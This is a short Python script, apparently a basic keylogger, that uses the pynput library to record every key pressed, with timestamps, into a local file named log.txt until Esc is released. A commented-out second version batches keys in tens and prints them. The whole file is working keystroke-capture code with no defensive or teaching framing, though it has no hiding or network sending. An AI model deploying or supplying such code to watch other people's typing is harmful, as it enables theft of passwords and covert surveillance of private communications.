import pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename= ("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# keys = []
# count = 0
# def on_press(key):
#     global keys, count
#     keys.append(key)
#     count+=1
#     if count == 10:
#         count = 0
#         print(keys)
#         keys = []

    
# def on_release(key):
#     if key == Key.esc:
#         return False

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()